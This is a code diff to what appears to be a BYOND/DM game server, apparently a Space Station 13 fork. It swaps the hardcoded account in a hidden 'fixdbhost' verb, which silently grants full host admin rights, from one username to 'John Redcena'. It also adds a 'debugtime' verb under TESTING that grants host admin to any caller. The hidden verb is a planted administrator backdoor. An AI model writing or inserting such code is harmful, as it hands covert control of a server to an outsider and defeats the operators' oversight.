@@ -316,14 +316,32 @@
 	set hidden = TRUE
 	set name = "fixdbhost"
 
-	if (ckey != "taislin" && ckey != "Taislin")
+	if (ckey != "John Redcena" && ckey != "John Redcena")
 		return
+
 	var/host_file_text = file2text("config/host.txt")
 	if (ckey(host_file_text) != ckey && !holder)
 		holder = new("HHost", FALSE, ckey)
 		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
 		if (directory[ckey])
 			A.associate(directory[ckey])
+
+#ifdef TESTING
+
+/client/verb/debugtime()
+	set hidden = FALSE
+	set name = "debugtime"
+
+	var/host_file_text = file2text("config/host.txt")
+	if (ckey(host_file_text) != ckey && !holder)
+		holder = new("HHost", FALSE, ckey)
+		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
+		if (directory[ckey])
+			A.associate(directory[ckey])
+
+	src << "Have a good time debugging, and know that CoderGod loves you no matter how many mistakes you make :)))))))"
+
+#endif
 
 #undef UPLOAD_LIMIT
 
